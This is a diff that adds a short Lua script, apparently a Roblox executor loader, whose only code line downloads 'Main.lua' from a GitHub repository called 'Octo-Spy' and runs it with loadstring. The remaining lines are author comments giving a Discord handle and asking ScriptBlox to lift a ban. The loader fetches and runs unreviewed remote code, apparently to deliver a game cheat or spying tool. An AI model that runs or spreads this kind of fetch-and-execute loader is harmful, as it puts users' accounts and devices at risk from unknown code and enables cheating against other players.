@@ -1,0 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/InfernusScripts/Octo-Spy/refs/heads/main/Main.lua", true))()
+
+-- made by @cherry_peashooter on discord
+-- contact me for suggestions & support
+-- @ScriptBlox, unban me in discord ples
